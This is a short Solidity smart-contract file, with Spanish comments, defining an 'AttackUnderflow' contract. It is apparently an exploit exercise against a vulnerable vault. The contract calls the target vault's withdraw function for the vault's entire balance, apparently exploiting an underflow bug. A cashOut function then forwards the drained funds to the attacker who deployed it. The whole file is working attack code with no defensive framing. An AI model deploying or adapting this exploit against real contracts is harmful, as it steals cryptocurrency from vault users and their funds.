pragma solidity ^0.6.0;

interface ICryptoVault {
    function withdraw(uint _amount) external;
}

contract AttackUnderflow {
    ICryptoVault public targetVault;
    
    // Declaramos una variable para guardar quién es el dueño 
    address payable public owner; 

    constructor(address _vaultAddress) public {
        targetVault = ICryptoVault(_vaultAddress);
        
        owner = msg.sender; 
    }

    function attack() external {
        uint vaultBalance = address(targetVault).balance;
        targetVault.withdraw(vaultBalance);
    }

    function cashOut() external {
        require(msg.sender == owner, "Solo el atacante original puede retirar los fondos");
        
        uint myBalance = address(this).balance;
        (bool success, ) = owner.call{value: myBalance}("");
        require(success, "Fallo al transferir los fondos a tu cuenta");
    }

    receive() external payable {}
}